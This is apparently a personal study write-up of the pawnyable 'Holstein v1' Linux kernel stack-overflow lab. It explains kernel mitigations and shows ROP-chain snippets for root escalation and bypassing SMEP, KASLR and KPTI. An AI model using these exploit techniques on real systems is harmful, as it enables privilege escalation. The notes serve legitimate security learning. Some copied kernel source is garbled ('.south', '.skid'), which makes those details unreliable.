# Kernel exploitation
## Holstein v1: Exploiting Stack Overflow 
## Table of contents

- [Security mechanisms](#Security_mechanism)
	- [SMEP (Supervisor Mode Execution Prevention)](#SMEP_(Supervisor_Mode_Execution_Prevention) )

	- [SMAP (Supervisor Mode Access Prevention)](#SMAP_(Supervisor_Mode_Access_Prevention))

	- [KASLR / FGKASLR](#KASLR_/_FGKASLR)

	- [KPTI (Kernel Page-Table Isolation) ](#KPTI (Kernel_Page-Table_Isolation))

	- [KADR (Kernel Address Display Restriction) ](#KADR_(Kernel_Address_Display_Restriction))
- [Compilation and exploit transfer](#Compilation_and_exploit_transfer)
	- [Extract / compress cpio file type](#Extract_/_compress_cpio_file_type)

- [Bof](#Bof)
	- [prepare_kernel_cred and commit_creds](#prepare_kernel_cred_and_commit_creds)
	- [Important instructions](#Important_instructions)
	- [KROP (Kernel ROP)](#KROP_(Kernel_ROP))
		- [KPTI](#KPTI)
		- [KASLR](#KASLR)
		- [SMEP / SMAP](#SMEP_/_SMAP)
	- [Exploit bof](#Exploit_bof)
		- [swapgs_restore_regs_and_return_to_usermode](#swapgs_restore_regs_and_return_to_usermode)
		- [handler_signal](#handler_signal)

- [References](#References)

## Security mechanism
CR4 register : enables security hardware by setting bits of this register
- SMEP: 21st bit
- SMAP: 22st bit

### SMEP (Supervisor Mode Execution Prevention) 
prevents the sudden execution of user-space code while kernel-space code is running

If SMEP is enabled, attempting to execute shellcode prepared in user space will cause a kernel panic

- SMEP can be enabled as an argument when running qemu
```c
-cpu kvm64,+smep 
```
- Check if SMEP enabled by running this inside the machine:
```c
cat /proc/cpuinfo | grep smep
```
### SMAP (Supervisor Mode Access Prevention) 
Prevent kernel from read / write data to user-space
### KASLR / FGKASLR
KASLR: address space layout randomization (ASLR) like user-space

If you can leak the address of a function or data in linux kernel, you're supposed to have base address

FGKASLR: Stronger ASLR than normal one, randomize function address

You can't get base address by leaking function address but you can get base by leak address of data section since it doesn't randomize that map

KASLR can be disabled as a kernel boot argument
```c
// If it says "KASLR", then KASLR is disabled. 
-append "... nokaslr ..."
```
### KPTI (Kernel Page-Table Isolation) 
KPTI is a security mechanism solely for preventing Meltdown, so it doesn't pose a problem in normal kernel exploits. However, if KPTI is enabled when performing ROP in kernel space, problems will occur when returning to user space at the end

KPTI is a page table switch, so you can switch between user and kernel space by manipulating the CR3 register. In Linux, you can switch from kernel space to user space by ORing CR3 with 0x1000 (i.e., changing the PDBR)
### KADR (Kernel Address Display Restriction) 
The value of this ``/proc/sys/kernel/kptr_restrict`` results in the address display restrictions

case:
- 0: no restrictions
- 1: display with neccessary permissions acquired
- 2: Hidden even if you're on privileged level
## Compilation and exploit transfer 
The image may use different libc rather than the one in local host. So I should compile the exploit code in static linking for it to work in qemu
```c
gcc exploit.c -o exploit -static -g -O0 // -g -O0 for debug info
```
### Extract / compress cpio file type
Extract and compress cpio file as root to not getting boot issues

- Extract:
```c
sudo cpio -idv < rootfs.cpio
```
- Give file system root permission:
```c
sudo chown -R root:root *
```

- Compress:
```c
sudo sh -c 'find . | cpio -H newc -o > ../rootfs.cpio'
```
Run this to make entire command as sudo, not only find
## Bof
```/proc/sys/kernel/kptr_restrict```: This stores the vlaue of KADR
### prepare_kernel_cred and commit_creds 

To be simple, each process must have credentials. So ``prepare_kernel_cred`` init a new set of credentialss for ``existed / uninitialized`` process. ``Commit_cred`` applied those credentials to that process. And each process is managed
by a structure called a ``task_struct``, which contains a pointer to the cred structure. 

- task_struct:
```c
struct  task_struct  { 
    ... 
	/* Process credentials: */ 

	/* Tracer's credentials at attach: */ 
	const  struct  cred  __ rcu 		* ptracer_cred ; 

	/* Objective and real subjective task credentials (COW): */ 
	const  struct  cred  __ rcu 		* real_cred ; 

	/* Effective (overridable) subjective task credentials (COW): */ 
	const  struct  cred  __ rcu 		* cred ; 
    ... 
} 
```
- prepare_kernel_cred
```c
/* Takes a pointer to a task_struct structure as an argument */ 
struct  cred * prepare_kernel_cred ( struct  task_struct *daemon) 
{ 
	const  struct  cred  * old ; 
	struct  cred  * new ; 

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL); 
	if  (!new) 
		return  NULL ; 

	kdebug( "prepare_kernel_cred() alloc %p" , new); 

	if  (daemon) // If process already exist
		old = get_task_cred(daemon); 
	else  // If NULL, the process didn't exist
		old = get_cred(&init_cred); 

    ... 

    return  new; 
} 
```
The cred structure is created when a process is created, and the function responsible for this is **prepare_kernel_cred**. This is a very important function in kernel exploits.

init_cred is precisely a cred structure with root privileges. 
```c
/* 
 * The initial credentials for the initial task 
 */ 
struct  cred  init_cred  =  { 
	.usage			= ATOMIC_INIT( 4 ), 
# ifdef  CONFIG_DEBUG_CREDENTIALS 
	.subscribers		= ATOMIC_INIT( 2 ), 
	.magic			= CRED_MAGIC, 
# endif 
	.uid			= GLOBAL_ROOT_UID, 
	.gid			= GLOBAL_ROOT_GID, 
.south = GLOBAL_ROOT_UID, 
 .skid = GLOBAL_ROOT_GID, 
.euid = GLOBAL_ROOT_UID, 
 .egid = GLOBAL_ROOT_GID, 
	.fsuid			= GLOBAL_ROOT_UID, 
	.fsgid			= GLOBAL_ROOT_GID, 
	.securebits		= SECUREBITS_DEFAULT, 
	.cap_inheritable	= CAP_EMPTY_SET, 
	.cap_permitted		= CAP_FULL_SET, 
	.cap_effective		= CAP_FULL_SET, 
	.cap_bset		= CAP_FULL_SET, 
	.user			= INIT_USER, 
	.user_ns		= &init_user_ns, 
	.group_info		= &init_groups, 
.ucounts = &init_ucounts, 
}; 
```

In exploitation, that function should be called like this:
```c
prepare_kernel_cred(NULL)
```

You can call this to get a cred structure with root privilege and apply to current process immediately. 
```c
commit_creds(prepare_kernel_cred( NULL )); 
```

**From Linux kernel 6.2 onwards prepare_kernel_cred to this . It is no longer possible to pass **NULL****

init_cred still exists, You can achieve the same result by executing this command:
```c
commit_creds(&init_cred)
```

### Important instructions
- Swapgs: Return to user space
- iretq: Like saved rip but help return from kernel to user-space

You need call these in order

When calling this **iretq**, the stack must contain the following information about the user space destination: 
```c
kernel rsp -->: User RIP
				User CS
				User RFLAGS
				User RSP
				User SS
```

To find address of any symbol in kernel, use this command:
```c
grep <symbol_name> /proc/kallsyms

Exmaple input: 
grep init_cred /proc/kallsyms

Expected output:
ffffffff8158cb10 t maybe_init_creds
```

### KROP (Kernel ROP)
First, to find the Linux kernel ROP gadget, you need to extract to get the ELF file called vmlinux, which is the kernel core, from the bzImage

A [tool](https://github.com/marin-m/vmlinux-to-elf) for this step: 
```c
vmlinux-to-elf bzImage vmlinux   
```

[Example exploit](https://pawnyable.cafe/linux-kernel/LK01/exploit/krop.c)
#### KPTI
KPTI itself is not a mitigation measure for general vulnerabilities like this, but rather a mitigation measure to deal with a specific side-channel attack called Meltdown. Therefore, it does not affect the exploit methods used so far, but if you execute the exploit with KPTI enabled, it will crash in user space:

```c
/home # ./exploit
[*] Saved state!!
Leak: 0xffffffff81000000
 iretq: 0xffffffff810202af
kernel BUG at kernel/cred.c:452!
invalid opcode: 0000 [#1] PREEMPT SMP PTI
CPU: 0 PID: 175 Comm: exploit Tainted: G           O      5.10.7 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.17.0-2-2 044
RIP: 0010:commit_creds+0x12f/0x160
```

Because it's dead in user space. swapgs then iretq. Although I've returned to user space, the page directory remains in kernel space due to KPTI, so I can't read pages in user space. 

It's necessary to OR 0x1000 with the CR3 register before returning to userland. You might be wondering, "Does such a gadget even exist?", but this process is always present in the normal process of returning from the kernel to user space, so it will 100% be found. 

Try to use to update CR3
```c
cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode 
```
If the symbol is missing, you can use objdump or similar tools to find the operation on CR3 (the part where the operation is performed using rdi). 

```c
@CTF> ROPgadget --binary vmlinux | grep 'mov cr3, rdi'

0xffffffff8180014a : mov cr3, rdi ; pop rax ; pop rdi ; pop rsp ; swapgs ; sysretq

0xffffffff81800e86 : mov cr3, rdi ; pop rax ; pop rdi ; swapgs ; jmp 0xffffffff81800eb0
```

However, once CR3 is updated to a user-space value, the data on the kernel-space stack can no longer be referenced, so the last pop or iretq cannot read the data.

Actually (and this may seem obvious), there are several locations that are accessible from both user space and kernel space in order to implement this context switching. 

```python
movq	%rsp, %rdi 
movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp 
UNWIND_HINT_EMPTY
```

Since it's built using (rdi is the original rsp), you need to place the data used by swapgs 0x10 bytes away from the gadget call. 

```c
*chain++ = bypass_kpti;
*chain++ = 0xdeadbeef;
*chain++ = 0xcafebabe;
*chain++ = (uint64_t) &win;
*chain++ = user_cs;
*chain++ = user_rflags;
*chain++ = user_rsp;
*chain++ = user_ss;
```

#### KASLR
Kernel address randomization is performed at the page table level

It is implemented using [kernel_randomize_memory](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/mm/kaslr.c#L64) function. The kernel allocates a `1GB` address space from `0xffffffff80000000 to 0xffffffffc0000000`. Therefore, even with KASLR enabled, only about `0x3f0` possible `base addresses` are generated, ranging from `0x810 to 0xc00`. 

` in the kernel, if an attack fails even once, it causes a kernel panic, making brute-force attacks impractical, so even a small amount of entropy is sufficient. `

#### SMEP / SMAP
Because SMEP avoid userland shellcode execution during kernel process so I can easily bypass this by using ROP

SMAP avoid read / write from kernel to userland so I can use the same method to bypass too

`Just ROP!`

### Exploit bof
Im following [pwnyable](https://pawnyable.cafe/linux-kernel/) guild so I'll exploit the first [example](https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01.tar.gz) of this guide with those mitigation enabled:

- SMEP
- KASLR
- KPTI

The module in this kernel has 2 main vulnerbilities:
- OOB read
- Bof write

I can easily get kernel base because of OOB read, just read rip of `module_read` 

With `MEP` enabled, I can't execute direct shellcode in userspace so I will use `ROP chain` from kernel-space to user-space to completely bypass this

The next mitigation is KPTI, this will block me when I try to switch from kernel and userland. The reason is it has a register named `CR3`, this will define whether I'm in `user page` or `kernel page`. Therefore, I have to xor `CR3` first in `kernel land`

There are 2 ways to do this

#### swapgs_restore_regs_and_return_to_usermode
use `swapgs_restore_regs_and_return_to_usermode` function. This is a function called when kernel switch from `ring 0 (kernel land)` to `ring 3 (userland)`:
```c
pwndbg> x/50i 0xffffffff81800e26
=> 0xffffffff81800e26 <swapgs_restore_regs_and_return_to_usermode+22>:	mov    rdi,rsp
   0xffffffff81800e29 <swapgs_restore_regs_and_return_to_usermode+25>:	mov    rsp,QWORD PTR gs:0x6004
   0xffffffff81800e32 <swapgs_restore_regs_and_return_to_usermode+34>:	push   QWORD PTR [rdi+0x30]
   0xffffffff81800e35 <swapgs_restore_regs_and_return_to_usermode+37>:	push   QWORD PTR [rdi+0x28]
   0xffffffff81800e38 <swapgs_restore_regs_and_return_to_usermode+40>:	push   QWORD PTR [rdi+0x20]
   0xffffffff81800e3b <swapgs_restore_regs_and_return_to_usermode+43>:	push   QWORD PTR [rdi+0x18]
   0xffffffff81800e3e <swapgs_restore_regs_and_return_to_usermode+46>:	push   QWORD PTR [rdi+0x10]
   0xffffffff81800e41 <swapgs_restore_regs_and_return_to_usermode+49>:	push   QWORD PTR [rdi]
   0xffffffff81800e43 <swapgs_restore_regs_and_return_to_usermode+51>:	push   rax
   0xffffffff81800e44 <swapgs_restore_regs_and_return_to_usermode+52>:	xchg   ax,ax
   0xffffffff81800e46 <swapgs_restore_regs_and_return_to_usermode+54>:	mov    rdi,cr3
   0xffffffff81800e49 <swapgs_restore_regs_and_return_to_usermode+57>:	jmp    0xffffffff81800e7f <swapgs_restore_regs_and_return_to_usermode+111>
  ...
   0xffffffff81800e7f <swapgs_restore_regs_and_return_to_usermode+111>:	or     rdi,0x1000
   0xffffffff81800e86 <swapgs_restore_regs_and_return_to_usermode+118>:	mov    cr3,rdi
   0xffffffff81800e89 <swapgs_restore_regs_and_return_to_usermode+121>:	pop    rax
   0xffffffff81800e8a <swapgs_restore_regs_and_return_to_usermode+122>:	pop    rdi
   0xffffffff81800e8b <swapgs_restore_regs_and_return_to_usermode+123>:	swapgs
   0xffffffff81800e8e <swapgs_restore_regs_and_return_to_usermode+126>:	jmp    0xffffffff81800eb0 <native_iret>
  ...
   0xffffffff81800eb0 <native_iret>:	test   BYTE PTR [rsp+0x20],0x4
   0xffffffff81800eb5 <native_iret+5>:	jne    0xffffffff81800eb9 <native_irq_return_ldt>
   0xffffffff81800eb7 <native_irq_return_iret>:	iretq
```
In my case, I'll use this address `0xffffffff81800e26` to change `CR3` after calling `commit_cred(prepare_kernel_cred(NULL))`:
```c
*chain++ = pop_rdi;
*chain++ = 0;
*chain++ = prepare_kernel_cred;
*chain++ = pop_rcx;
*chain++ = 0;
*chain++ = mov_rdi_rax;
*chain++ = commit_cred;
```
I also need to set up stack frame for `iretq` call:
```c
iretq

rsp ->  User RIP
		User CS
		User RFLAGS
		User RSP
		User SS
```
- Example:
```c
00:0000│ rsp 0xfffffe0000002fd8 —▸ 0x40313b ◂— push rbp
01:0008│     0xfffffe0000002fe0 ◂— 0x33 /* '3' */
02:0010│     0xfffffe0000002fe8 ◂— 0x246
03:0018│     0xfffffe0000002ff0 —▸ 0x7ffc9b66a3b8 —▸ 0x406110 ◂— mov rax, 0xf
04:0020│     0xfffffe0000002ff8 ◂— 0x2b /* '+' */
```
#### handler_signal
There is another way to exploit this thanks to [kase's write up](https://github.com/5o1z/notes/tree/main/LKE/LK01/HolsteinV1#return-to-userspace) `signal_handler`. I can just call `swapgs` and `iretq` directly and it will trigger the `signal handler` which I set up and called it before calling `write`
```c
struct sigaction sigact;
void handler_config(){
  sigact.sa_handler = win;
  sigemptyset(&sigact.sa_mask);
  sigact.sa_flags = 0;
  sigaction(SIGSEGV, &sigact, (struct sigaction *)NULL);
}
```
The flow is simple, after I call iretq, I'll go to the win function and immediately jump to `asm_exc_page_fault` because I'm still in `kernel page`

- Flow:
```c
--> asm_exc_page_fault 
	--> error_entry (switch back to ring 0) 
		--> sync_regs 
	--> exc_page_fault
		--> irqentry_enter
		--> fault_in_kernel_space
		--> down_read_trylock
	...
--> error_return
↓
► 0xffffffff81800ace <asm_exc_page_fault+30>                           jmp    0xffffffff818011b0          <error_return>
↓
0xffffffff818011b0 <error_return>                                    test   byte ptr [rsp + 0x88], 3
0xffffffff818011b8 <error_return+8>                                  je     0xffffffff81800e90          <restore_regs_and_return_to_kernel>

0xffffffff818011be <error_return+14>                                 jmp    0xffffffff81800e10          <swapgs_restore_regs_and_return_to_usermode>
↓
0xffffffff81800e10 <swapgs_restore_regs_and_return_to_usermode>      pop    r15
0xffffffff81800e12 <swapgs_restore_regs_and_return_to_usermode+2>    pop    r14

// Get back to usermode then go to Win
--> swapgs_restore_regs_and_return_to_usermode
```
As you can see, after the kernel handles the `page fault` it will return to `signal handler`, which I configured before so the handler function is my `win`

To be more specific with this way, let's see the `sigaction struct` first
```c
struct sigaction {
    void (*sa_handler)(int);   // Handler function
    sigset_t sa_mask;          // Signals to block while handler runs
    int sa_flags;              // Behavior flags
};
```
I use `sigemptyset` to clear `sa_mask` so there won't be any blocked signal in this step (useful for debug). `sa_flags` should be `0` because I don't need any special behavior. `Handler function` should be `win` so `sigact.sa_handler = win`. Finally, `sigaction` will be called to apply those changes to my `SIGSEGV` handler
# References
- https://github.com/5o1z/notes/edit/main/LKE/LK01/HolsteinV1/README.md
- https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html
